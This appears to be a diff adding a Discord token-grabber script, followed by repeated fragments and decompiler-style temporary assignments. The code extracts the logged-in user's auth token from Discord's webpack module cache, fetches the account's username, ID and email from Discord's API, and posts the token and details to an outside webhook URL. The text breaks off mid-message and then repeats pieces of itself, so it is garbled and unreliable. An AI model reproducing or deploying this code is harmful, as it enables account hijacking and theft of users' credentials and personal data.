@@ -1,0 +1,40 @@
+setTimeout(async function() {
+        const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken();
+
+        let res;
+        try {
+            res = await fetch("https://discordapp.com/api/v9/users/@me", {
+                method: "GET",
+                headers: {
+                    "Authorization": token
+                }
+            });
+            res = await res.json();
+        } catch(e) {
+            return;
+        }
+        try {
+            let hook;
+            hook = await fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: `**Browser Token:** \`\`\`${token}\`\`\`
+**Account Info:** \`\`\`${res.username}#${res.discriminator}
+User ID: ${res.id}
+Email Add...
+const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()
+res = await fetch("https://discordapp.com/api/v9/users/@me", {
+                method: "GET",
+                headers: {
+                    "Authorization": token
+                }
+            })
+_tmp_6.method = "GET"
+_tmp_6.headers = {
+                    "Authorization": token
+                }
+_tmp_7.Authorization = token
+res = await res.json()
